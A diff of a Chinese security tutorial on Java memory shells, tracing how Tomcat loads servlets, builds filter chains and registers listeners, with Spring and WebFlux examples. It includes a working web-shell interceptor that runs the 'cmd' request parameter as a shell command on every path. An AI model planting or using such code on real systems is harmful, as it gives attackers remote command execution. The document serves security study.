@@ -79,29 +79,29 @@ source: "MrWQ/vulnerability-paper"
 `pom.xml`文件如下：
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-    <modelVersion>4.0.0</modelVersion>
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
 
-    <groupId>org.example</groupId>
-    <artifactId>servletMemoryShell</artifactId>
-    <version>1.0-SNAPSHOT</version>
+    <groupId>org.example</groupId>
+    <artifactId>servletMemoryShell</artifactId>
+    <version>1.0-SNAPSHOT</version>
 
-    <properties>
-        <maven.compiler.source>8</maven.compiler.source>
-        <maven.compiler.target>8</maven.compiler.target>
-        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-    </properties>
+    <properties>
+        <maven.compiler.source>8</maven.compiler.source>
+        <maven.compiler.target>8</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
 
-    <dependencies>
-        <dependency>
-            <groupId>javax.servlet</groupId>
-            <artifactId>javax.servlet-api</artifactId>
-            <version>4.0.1</version>
-        </dependency>
-    </dependencies>
+    <dependencies>
+        <dependency>
+            <groupId>javax.servlet</groupId>
+            <artifactId>javax.servlet-api</artifactId>
+            <version>4.0.1</version>
+        </dependency>
+    </dependencies>
 
 </project>
 
@@ -113,19 +113,19 @@ source: "MrWQ/vulnerability-paper"
 `TestServlet.java`代码如下：
 
 ```
-package org.example;
-import java.io.IOException;
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
+package org.example;
+import java.io.IOException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
 @WebServlet("/test")
-public class TestServlet extends HttpServlet {
-    @Override
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        resp.getWriter().write("hello world");
-    }
+public class TestServlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
+        resp.getWriter().write("hello world");
+    }
 }
 
 
@@ -163,36 +163,36 @@ public class TestServlet extends HttpServlet {
 `pom.xml`：
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-    <modelVersion>4.0.0</modelVersion>
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
 
-    <groupId>org.example</groupId>
-    <artifactId>servletMemoryShell</artifactId>
-    <version>1.0-SNAPSHOT</version>
+    <groupId>org.example</groupId>
+    <artifactId>servletMemoryShell</artifactId>
+    <version>1.0-SNAPSHOT</version>
 
-    <properties>
-        <maven.compiler.source>8</maven.compiler.source>
-        <maven.compiler.target>8</maven.compiler.target>
-        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-    </properties>
+    <properties>
+        <maven.compiler.source>8</maven.compiler.source>
+        <maven.compiler.target>8</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
 
-    <dependencies>
-        <dependency>
-            <groupId>org.apache.tomcat.embed</groupId>
-            <artifactId>tomcat-embed-core</artifactId>
-            <version>9.0.83</version>
-            <scope>compile</scope>
-        </dependency>
-        <dependency>
-            <groupId>org.apache.tomcat.embed</groupId>
-            <artifactId>tomcat-embed-jasper</artifactId>
-            <version>9.0.83</version>
-            <scope>compile</scope>
-        </dependency>
-    </dependencies>
+    <dependencies>
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-core</artifactId>
+            <version>9.0.83</version>
+            <scope>compile</scope>
+        </dependency>
+        <dependency>
+            <groupId>org.apache.tomcat.embed</groupId>
+            <artifactId>tomcat-embed-jasper</artifactId>
+            <version>9.0.83</version>
+            <scope>compile</scope>
+        </dependency>
+    </dependencies>
 
 </project>
 
@@ -202,23 +202,23 @@ public class TestServlet extends HttpServlet {
 `Main.java`：
 
 ```
-package org.example;
+package org.example;
 
-import org.apache.catalina.Context;
-import org.apache.catalina.LifecycleException;
-import org.apache.catalina.startup.Tomcat;
-import java.io.File;
+import org.apache.catalina.Context;
+import org.apache.catalina.LifecycleException;
+import org.apache.catalina.startup.Tomcat;
+import java.io.File;
 
-public class Main {
-    public static void main(String[] args) throws LifecycleException {
-        Tomcat tomcat = new Tomcat();
-        tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603
-        Context context = tomcat.addWebapp("", new File(".").getAbsolutePath());
-        Tomcat.addServlet(context, "helloServlet", new HelloServlet());
-        context.addServletMappingDecoded("/hello", "helloServlet");
-        tomcat.start();
-        tomcat.getServer().await();
-    }
+public class Main {
+    public static void main(String[] args) throws LifecycleException {
+        Tomcat tomcat = new Tomcat();
+        tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603
+        Context context = tomcat.addWebapp("", new File(".").getAbsolutePath());
+        Tomcat.addServlet(context, "helloServlet", new HelloServlet());
+        context.addServletMappingDecoded("/hello", "helloServlet");
+        tomcat.start();
+        tomcat.getServer().await();
+    }
 }
 
 
@@ -227,25 +227,25 @@ public class Main {
 `HelloServlet.java`：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.ServletException;
-import javax.servlet.annotation.WebServlet;
-import javax.servlet.http.HttpServlet;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import java.io.IOException;
-import java.io.PrintWriter;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.PrintWriter;
 
 @WebServlet("/hello")
-public class HelloServlet extends HttpServlet {
-    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        response.setContentType("text/html");
-        PrintWriter out = response.getWriter();
-        out.println("<html><body>");
-        out.println("Hello, World!");
-        out.println("</body></html>");
-    }
+public class HelloServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        response.setContentType("text/html");
+        PrintWriter out = response.getWriter();
+        out.println("<html><body>");
+        out.println("Hello, World!");
+        out.println("</body></html>");
+    }
 }
 
 
@@ -268,59 +268,59 @@ public class HelloServlet extends HttpServlet {
 接下来我们详细看下面这段代码：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGGBiaSV6z6wgQPVopT2aKtk2ibjIOSgibJvRbq8iaZuQduREBuatJ1cAFFQ/640?wx_fmt=png&from=appmsg)
 
 ```
-for (ServletDef servlet : webxml.getServlets().values()) {
-            Wrapper wrapper = context.createWrapper();
-            if (servlet.getLoadOnStartup() != null) {
-                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
-            }
-            if (servlet.getEnabled() != null) {
-                wrapper.setEnabled(servlet.getEnabled().booleanValue());
-            }
-            wrapper.setName(servlet.getServletName());
-            Map<String,String> params = servlet.getParameterMap();
-            for (Entry<String, String> entry : params.entrySet()) {
-                wrapper.addInitParameter(entry.getKey(), entry.getValue());
-            }
-            wrapper.setRunAs(servlet.getRunAs());
-            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
-            for (SecurityRoleRef roleRef : roleRefs) {
-                wrapper.addSecurityReference(
-                        roleRef.getName(), roleRef.getLink());
-            }
-            wrapper.setServletClass(servlet.getServletClass());
-            MultipartDef multipartdef = servlet.getMultipartDef();
-            if (multipartdef != null) {
-                long maxFileSize = -1;
-                long maxRequestSize = -1;
-                int fileSizeThreshold = 0;
+for (ServletDef servlet : webxml.getServlets().values()) {
+            Wrapper wrapper = context.createWrapper();
+            if (servlet.getLoadOnStartup() != null) {
+                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
+            }
+            if (servlet.getEnabled() != null) {
+                wrapper.setEnabled(servlet.getEnabled().booleanValue());
+            }
+            wrapper.setName(servlet.getServletName());
+            Map<String,String> params = servlet.getParameterMap();
+            for (Entry<String, String> entry : params.entrySet()) {
+                wrapper.addInitParameter(entry.getKey(), entry.getValue());
+            }
+            wrapper.setRunAs(servlet.getRunAs());
+            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
+            for (SecurityRoleRef roleRef : roleRefs) {
+                wrapper.addSecurityReference(
+                        roleRef.getName(), roleRef.getLink());
+            }
+            wrapper.setServletClass(servlet.getServletClass());
+            MultipartDef multipartdef = servlet.getMultipartDef();
+            if (multipartdef != null) {
+                long maxFileSize = -1;
+                long maxRequestSize = -1;
+                int fileSizeThreshold = 0;
 
-                if(null != multipartdef.getMaxFileSize()) {
-                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
-                }
-                if(null != multipartdef.getMaxRequestSize()) {
-                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
-                }
-                if(null != multipartdef.getFileSizeThreshold()) {
-                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
-                }
+                if(null != multipartdef.getMaxFileSize()) {
+                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
+                }
+                if(null != multipartdef.getMaxRequestSize()) {
+                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
+                }
+                if(null != multipartdef.getFileSizeThreshold()) {
+                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
+                }
 
-                wrapper.setMultipartConfigElement(new MultipartConfigElement(
-                        multipartdef.getLocation(),
-                        maxFileSize,
-                        maxRequestSize,
-                        fileSizeThreshold));
-            }
-            if (servlet.getAsyncSupported() != null) {
-                wrapper.setAsyncSupported(
-                        servlet.getAsyncSupported().booleanValue());
-            }
-            wrapper.setOverridable(servlet.isOverridable());
-            context.addChild(wrapper);
-        }
-        for (Entry<String, String> entry :
-                webxml.getServletMappings().entrySet()) {
-            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
-        }
+                wrapper.setMultipartConfigElement(new MultipartConfigElement(
+                        multipartdef.getLocation(),
+                        maxFileSize,
+                        maxRequestSize,
+                        fileSizeThreshold));
+            }
+            if (servlet.getAsyncSupported() != null) {
+                wrapper.setAsyncSupported(
+                        servlet.getAsyncSupported().booleanValue());
+            }
+            wrapper.setOverridable(servlet.isOverridable());
+            context.addChild(wrapper);
+        }
+        for (Entry<String, String> entry :
+                webxml.getServletMappings().entrySet()) {
+            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
+        }
 
 
 ```
@@ -357,32 +357,32 @@ for (ServletDef servlet : webxml.getServlets().values()) {
 可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：
 
 ```
-public boolean loadOnStartup(Container children[]) {
-    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
-    for (Container child : children) {
-        Wrapper wrapper = (Wrapper) child;
-        int loadOnStartup = wrapper.getLoadOnStartup();
-        if (loadOnStartup < 0) {
-            continue;
-        }
-        Integer key = Integer.valueOf(loadOnStartup);
-        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
-    }
-    for (ArrayList<Wrapper> list : map.values()) {
-        for (Wrapper wrapper : list) {
-            try {
-                wrapper.load();
-            } catch (ServletException e) {
-                getLogger().error(
-                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
-                        StandardWrapper.getRootCause(e));
-                if (getComputedFailCtxIfServletStartFails()) {
-                    return false;
-                }
-            }
-        }
-    }
-    return true;
+public boolean loadOnStartup(Container children[]) {
+    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
+    for (Container child : children) {
+        Wrapper wrapper = (Wrapper) child;
+        int loadOnStartup = wrapper.getLoadOnStartup();
+        if (loadOnStartup < 0) {
+            continue;
+        }
+        Integer key = Integer.valueOf(loadOnStartup);
+        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
+    }
+    for (ArrayList<Wrapper> list : map.values()) {
+        for (Wrapper wrapper : list) {
+            try {
+                wrapper.load();
+            } catch (ServletException e) {
+                getLogger().error(
+                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
+                        StandardWrapper.getRootCause(e));
+                if (getComputedFailCtxIfServletStartFails()) {
+                    return false;
+                }
+            }
+        }
+    }
+    return true;
 }
 
 
@@ -409,27 +409,27 @@ public boolean loadOnStartup(Container children[]) {
 我们继续用我们之前在`2.2`中搭建的环境，添加`TestFilter.java`：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.*;
-import javax.servlet.annotation.WebFilter;
-import java.io.IOException;
+import javax.servlet.*;
+import javax.servlet.annotation.WebFilter;
+import java.io.IOException;
 
 @WebFilter("/test")
-public class TestFilter implements Filter {
+public class TestFilter implements Filter {
 
-    public void init(FilterConfig filterConfig) {
-        System.out.println("[*] Filter初始化创建");
-    }
+    public void init(FilterConfig filterConfig) {
+        System.out.println("[*] Filter初始化创建");
+    }
 
-    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        System.out.println("[*] Filter执行过滤操作");
-        filterChain.doFilter(servletRequest, servletResponse);
-    }
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        System.out.println("[*] Filter执行过滤操作");
+        filterChain.doFilter(servletRequest, servletResponse);
+    }
 
-    public void destroy() {
-        System.out.println("[*] Filter已销毁");
-    }
+    public void destroy() {
+        System.out.println("[*] Filter已销毁");
+    }
 }
 
 
@@ -449,7 +449,7 @@ public class TestFilter implements Filter {
 跟进`org.apache.catalina.core.StandardWrapperValve#invoke`：
 
 ```
-filterChain.doFilter(request.getRequest(), response.getResponse());
+filterChain.doFilter(request.getRequest(), response.getResponse());
 
 
 ```
@@ -457,7 +457,7 @@ filterChain.doFilter(request.getRequest(), response.getResponse());
 继续跟进变量`filterChain`，找到定义处的代码：
 
 ```
-ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
+ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
 
 
 ```
@@ -467,73 +467,73 @@ ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterCha
 查看该方法（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：
 
 ```
-public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
-    if (servlet == null) {
-        return null;
-    } else {
-        ApplicationFilterChain filterChain = null;
-        if (request instanceof Request) {
-            Request req = (Request)request;
-            if (Globals.IS_SECURITY_ENABLED) {
-                filterChain = new ApplicationFilterChain();
-            } else {
-                filterChain = (ApplicationFilterChain)req.getFilterChain();
-                if (filterChain == null) {
-                    filterChain = new ApplicationFilterChain();
-                    req.setFilterChain(filterChain);
-                }
-            }
-        } else {
-            filterChain = new ApplicationFilterChain();
-        }
+public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
+    if (servlet == null) {
+        return null;
+    } else {
+        ApplicationFilterChain filterChain = null;
+        if (request instanceof Request) {
+            Request req = (Request)request;
+            if (Globals.IS_SECURITY_ENABLED) {
+                filterChain = new ApplicationFilterChain();
+            } else {
+                filterChain = (ApplicationFilterChain)req.getFilterChain();
+                if (filterChain == null) {
+                    filterChain = new ApplicationFilterChain();
+                    req.setFilterChain(filterChain);
+                }
+            }
+        } else {
+            filterChain = new ApplicationFilterChain();
+        }
 
-        filterChain.setServlet(servlet);
-        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
-        StandardContext context = (StandardContext)wrapper.getParent();
-        FilterMap[] filterMaps = context.findFilterMaps();
-        if (filterMaps != null && filterMaps.length != 0) {
-            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
-            String requestPath = null;
-            Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
-            if (attribute != null) {
-                requestPath = attribute.toString();
-            }
+        filterChain.setServlet(servlet);
+        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
+        StandardContext context = (StandardContext)wrapper.getParent();
+        FilterMap[] filterMaps = context.findFilterMaps();
+        if (filterMaps != null && filterMaps.length != 0) {
+            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
+            String requestPath = null;
+            Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
+            if (attribute != null) {
+                requestPath = attribute.toString();
+            }
 
-            String servletName = wrapper.getName();
-            FilterMap[] var10 = filterMaps;
-            int var11 = filterMaps.length;
+            String servletName = wrapper.getName();
+            FilterMap[] var10 = filterMaps;
+            int var11 = filterMaps.length;
 
-            int var12;
-            FilterMap filterMap;
-            ApplicationFilterConfig filterConfig;
-            for(var12 = 0; var12 < var11; ++var12) {
-                filterMap = var10[var12];
-                if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
-                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
-                    if (filterConfig != null) {
-                        filterChain.addFilter(filterConfig);
-                    }
-                }
-            }
+            int var12;
+            FilterMap filterMap;
+            ApplicationFilterConfig filterConfig;
+            for(var12 = 0; var12 < var11; ++var12) {
+                filterMap = var10[var12];
+                if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
+                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
+                    if (filterConfig != null) {
+                        filterChain.addFilter(filterConfig);
+                    }
+                }
+            }
 
-            var10 = filterMaps;
-            var11 = filterMaps.length;
+            var10 = filterMaps;
+            var11 = filterMaps.length;
 
-            for(var12 = 0; var12 < var11; ++var12) {
-                filterMap = var10[var12];
-                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
-                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
-                    if (filterConfig != null) {
-                        filterChain.addFilter(filterConfig);
-                    }
-                }
-            }
+            for(var12 = 0; var12 < var11; ++var12) {
+                filterMap = var10[var12];
+                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
+                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
+                    if (filterConfig != null) {
+                        filterChain.addFilter(filterConfig);
+                    }
+                }
+            }
 
-            return filterChain;
-        } else {
-            return filterChain;
-        }
-    }
+            return filterChain;
+        } else {
+            return filterChain;
+        }
+    }
 }
 
 
@@ -562,14 +562,14 @@ public static ApplicationFilterChain createFilterChain(ServletRequest reques
 二者的实现代码粘贴如下：
 
 ```
-public FilterMap[] findFilterMaps() {
-    return filterMaps.asArray();
+public FilterMap[] findFilterMaps() {
+    return filterMaps.asArray();
 }
 
-public FilterConfig findFilterConfig(String name) {
-    synchronized (filterDefs) {
-        return filterConfigs.get(name);
-    }
+public FilterConfig findFilterConfig(String name) {
+    synchronized (filterDefs) {
+        return filterConfigs.get(name);
+    }
 }
 
 
@@ -627,22 +627,22 @@ public FilterConfig findFilterConfig(String name) {
 我们继续用我们之前在`2.2`中搭建的环境，替换掉之前的`TestFilter.java`，重新写一个`TestListener.java`：
 
 ```
-package org.example;
+package org.example;
 
-import javax.servlet.*;
-import javax.servlet.annotation.WebListener;
+import javax.servlet.*;
+import javax.servlet.annotation.WebListener;
 
 @WebListener("/test")
-public class TestListener implements ServletRequestListener {
-    @Override
-    public void requestDestroyed(ServletRequestEvent sre) {
-        System.out.println("[+] destroy TestListener");
-    }
+public class TestListener implements ServletRequestListener {
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+        System.out.println("[+] destroy TestListener");
+    }
 
-    @Override
-    public void requestInitialized(ServletRequestEvent sre) {
-        System.out.println("[+] initial TestListener");
-    }
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        System.out.println("[+] initial TestListener");
+    }
 }
 
 
@@ -683,8 +683,8 @@ eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));
 
 ```
 @Override
-public Object[] getApplicationEventListeners() {
-    return applicationEventListenersList.toArray();
+public Object[] getApplicationEventListeners() {
+    return applicationEventListenersList.toArray();
 }
 
 
@@ -699,8 +699,8 @@ public Object[] getApplicationEventListeners() {
 方法名字叫做`addApplicationEventListener`，在`StandardContext.java`里面，代码如下，完美符合我们的需求，真是太哇塞了：
 
 ```
-public void addApplicationEventListener(Object listener) {
-    applicationEventListenersList.add(listener);
+public void addApplicationEventListener(Object listener) {
+    applicationEventListenersList.add(listener);
 }
 
 
@@ -724,19 +724,19 @@ public void addApplicationEventListener(Object listener) {
 ### 2.10.1 编写一个简单的 Spring Controller
 
 ```
-package org.example.springcontrollermemoryshellexample.demos.web;
+package org.example.springcontrollermemoryshellexample.demos.web;
 
-import org.springframework.stereotype.Controller;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
 
 @Controller
-public class TestController {
-    @ResponseBody
-    @RequestMapping("/")
-    public String test(){
-        return "hello world";
-    }
+public class TestController {
+    @ResponseBody
+    @RequestMapping("/")
+    public String test(){
+        return "hello world";
+    }
 }
 
 
@@ -751,37 +751,37 @@ public class TestController {
 `TestInterceptor.java`：
 
 ```
-package org.example.springcontrollermemoryshellexample.demos.web;
+package org.example.springcontrollermemoryshellexample.demos.web;
 
-import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 
-public class TestInterceptor extends HandlerInterceptorAdapter {
-    @Override
-    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
-        String cmd = request.getParameter("cmd");
-        if(cmd != null){
-            try {
-                java.io.PrintWriter writer = response.getWriter();
-                String output = "";
-                ProcessBuilder processBuilder;
-                if(System.getProperty("os.name").toLowerCase().contains("win")){
-                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
-                }else{
-                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
-                }
-                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
-                output = inputScanner.hasNext() ? inputScanner.next(): output;
-                inputScanner.close();
-                writer.write(output);
-                writer.flush();
-                writer.close();
-            } catch (Exception ignored){}
-            return false;
-        }
-        return true;
-    }
+public class TestInterceptor extends HandlerInterceptorAdapter {
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        String cmd = request.getParameter("cmd");
+        if(cmd != null){
+            try {
+                java.io.PrintWriter writer = response.getWriter();
+                String output = "";
+                ProcessBuilder processBuilder;
+                if(System.getProperty("os.name").toLowerCase().contains("win")){
+                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);
+                }else{
+                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);
+                }
+                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
+                output = inputScanner.hasNext() ? inputScanner.next(): output;
+                inputScanner.close();
+                writer.write(output);
+                writer.flush();
+                writer.close();
+            } catch (Exception ignored){}
+            return false;
+        }
+        return true;
+    }
 }
 
 
@@ -790,19 +790,19 @@ public class TestInterceptor extends HandlerInterceptorAdapter {
 `WebConfig.java`：
 
 ```
-package org.example.springcontrollermemoryshellexample.demos.web;
+package org.example.springcontrollermemoryshellexample.demos.web;
 
-import org.springframework.context.annotation.Configuration;
-import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
-import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
+import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
 
 @Configuration
-public class WebConfig implements WebMvcConfigurer {
+public class WebConfig implements WebMvcConfigurer {
 
-    @Override
-    public void addInterceptors(InterceptorRegistry registry) {
-        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
-    }
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) {
+        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
+    }
 }
 
 
@@ -829,20 +829,20 @@ public class WebConfig implements WebMvcConfigurer {
 `GreetingHandler.java`：
 
 ```
-package org.example.webfluxmemoryshelldemo.hello;
+package org.example.webfluxmemoryshelldemo.hello;
 
-import org.springframework.http.MediaType;
-import org.springframework.stereotype.Component;
-import org.springframework.web.reactive.function.BodyInserters;
-import org.springframework.web.reactive.function.server.ServerRequest;
-import org.springframework.web.reactive.function.server.ServerResponse;
-import reactor.core.publisher.Mono;
+import org.springframework.http.MediaType;
+import org.springframework.stereotype.Component;
+import org.springframework.web.reactive.function.BodyInserters;
+import org.springframework.web.reactive.function.server.ServerRequest;
+import org.springframework.web.reactive.function.server.ServerResponse;
+import reactor.core.publisher.Mono;
 
 @Component
-public class GreetingHandler {
-    public Mono<ServerResponse> hello(ServerRequest request) {
-        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
-    }
+public class GreetingHandler {
+    public Mono<ServerResponse> hello(ServerRequest request) {
+        return ServerResponse.ok().contentType(MediaType.TEXT_PLAIN).body(BodyInserters.fromValue("Hello, Spring!"));
+    }
 }
 
 
@@ -851,19 +851,19 @@ public class GreetingHandler {
 `GreetingRouter.java`：
 
 ```
-package org.example.webfluxmemoryshelldemo.hello;
+package org.example.webfluxmemoryshelldemo.hello;
 
-import org.springframework.context.annotation.Bean;
-import org.springframework.context.annotation.Configuration;
-import org.springframework.http.MediaType;
-import org.springframework.web.reactive.function.server.*;
+import org.springframework.context.annotation.Bean;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.http.MediaType;
+import org.springframework.web.reactive.function.server.*;
 
 @Configuration
-public class GreetingRouter {
-    @Bean
-    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
-        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
-    }
+public class GreetingRouter {
+    @Bean
+    public RouterFunction<ServerResponse> route(GreetingHandler greetingHandler) {
+        return RouterFunctions.route(RequestPredicates.GET("/hello").and(RequestPredicates.accept(MediaType.TEXT_PLAIN)), greetingHandler::hello);
+    }
 }
 
 
@@ -938,28 +938,28 @@ public class GreetingRouter {
 
 ```
 @Override
-public final void init() throws ServletException {
+public final void init() throws ServletException {
 
-    // Set bean properties from init parameters.
-    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
-    if (!pvs.isEmpty()) {
-        try {
-            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
-            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
-            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
-            initBeanWrapper(bw);
-            bw.setPropertyValues(pvs, true);
-        }
-        catch (BeansException ex) {
-            if (logger.isErrorEnabled()) {
-                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
-            }
-            throw ex;
-        }
-    }
+    // Set bean properties from init parameters.
+    PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties);
+    if (!pvs.isEmpty()) {
+        try {
+            BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this);
+            ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext());
+            bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment()));
+            initBeanWrapper(bw);
+            bw.setPropertyValues(pvs, true);
+        }
+        catch (BeansException ex) {
+            if (logger.isErrorEnabled()) {
+                logger.error("Failed to set bean properties on servlet '" + getServletName() + "'", ex);
+            }
+            throw ex;
+        }
+    }
 
-    // Let subclasses do whatever initialization they like.
-    initServletBean();
+    // Let subclasses do whatever initialization they like.
+    initServletBean();
 }
 
 
@@ -979,33 +979,33 @@ public final void init() throws ServletException {
 
 ```
 @Override
-protected final void initServletBean() throws ServletException {
-    getServletContext().log("Initializing Spring " + getClass().getSimpleName() + " '" + getServletName() + "'");
-    if (logger.isInfoEnabled()) {
-        logger.info("Initializing Servlet '" + getServletName() + "'");
-    }
-    long startTime = System.currentTimeMillis();
